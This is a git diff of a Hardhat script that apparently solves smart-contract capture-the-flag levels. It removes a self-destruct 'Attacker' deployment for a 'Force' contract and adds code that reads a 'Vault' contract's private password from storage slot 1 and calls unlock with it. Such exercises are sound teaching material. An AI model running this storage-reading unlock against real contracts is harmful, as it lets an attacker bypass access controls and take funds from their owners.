@@ -1,61 +1,29 @@
 import { ethers } from "hardhat";
-import { expect } from "chai";
-import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
-import { any } from "hardhat/internal/core/params/argumentTypes";
-
-const CONTRACT_ADDRESS = "0xD3a8e62a14410F3bCA078A2d7ccE422Bf0B77C48";
+const CONTRACT_ADDRESS = "0x8701f1d16d08a9f2Ae120AF155977b431Fa32b51";
 const PLAYER_ADDRESS = "0x81215d34367AF48d01E728AfF2976d9Df32fE604";
-// const ATTACKER_CONTRACT = "0x0cB1b57838C55A73859E821F9a21cda08D60232E";
+const ATTACKER_CONTRACT = "";
 
 async function main() {
   const signer = await ethers.getSigner(PLAYER_ADDRESS);
   const contract = await ethers.getContractAt(
-    "Force",
+    "Vault",
     CONTRACT_ADDRESS,
     signer
   );
 
-  // Only needed for deployment
-  const attackerContractFactory = await ethers.getContractFactory(
-    "Attacker",
-    signer
-  );
+  const slot1 = await ethers.provider.getStorageAt(CONTRACT_ADDRESS, 1);
+  // the slot data looks like this -> "0x412076657279207374726f6e67207365637265742070617373776f7264203a29";
 
-  // Only needed for deployment
-  const attackerContract = await attackerContractFactory.deploy();
+  console.log(`The password is: ${slot1}`);
 
-  // const attackerContract = await ethers.getContractAt(
-  //   "Attacker",
-  //   ATTACKER_CONTRACT,
-  //   signer
-  // );
+  // see if the contracted returns `false` for unlocked
+  console.log("Is the contract locked", await contract.locked());
 
-  // In order to grab the contract details you can just log this
-  // console.log("lets Grab the attacker contract", attackerContract);
-  const depositValue = ethers.utils.parseEther(".0000005");
-  // // Lets test our deposit function
-  console.log("Sending the contract some money with the deposit");
-  let depositTX = await attackerContract.depositMoney({
-    value: depositValue,
-    from: PLAYER_ADDRESS,
-  });
-  // console.log(depositTX);
-  // console.log("checking if the the contract logged the deposit");
-  // await expect(attackerContract.depositMoney())
-  //   .to.emit(attackerContract, "depositEmitter")
-  //   .withArgs(anyValue, anyValue, anyValue);
-  // console.log(
-  //   "checking if the the contract self destructed and sent the money"
-  // );
-  // await expect(attackerContract.selfDestruct())
-  //   .to.emit(attackerContract, "selfDestructEmitter")
-  //   .withArgs(PLAYER_ADDRESS);
-  // Comment out if you don't need the attacker account
-  // const attackerContract = await ethers.getContractAt(
-  //   "Attacker",
-  //   ATTACKER_CONTRACT,
-  //   signer
-  // );
+  // send password by passing storage slot
+  console.log(await contract.unlock(slot1));
+
+  // see if the contracted returns `true` for unlocked
+  console.log(await contract.locked());
 }
 
 // We recommend this pattern to be able to use async/await everywhere
